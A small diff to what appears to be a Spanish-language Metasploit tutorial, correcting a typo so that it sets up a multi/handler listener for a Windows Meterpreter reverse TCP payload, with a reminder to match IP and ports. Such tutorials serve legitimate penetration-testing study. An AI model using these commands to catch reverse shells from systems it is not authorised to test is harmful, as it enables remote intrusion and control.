@@ -69,7 +69,7 @@ _Para poder monitorear:_
 use exploit/multi/handler
 ```
 ```
-set payload windows/meterpreter/reverser_tcp
+set payload windows/meterpreter/reverse_tcp
 ```
 _Es muy importante que coloques la misma ip y puertos_
 ```
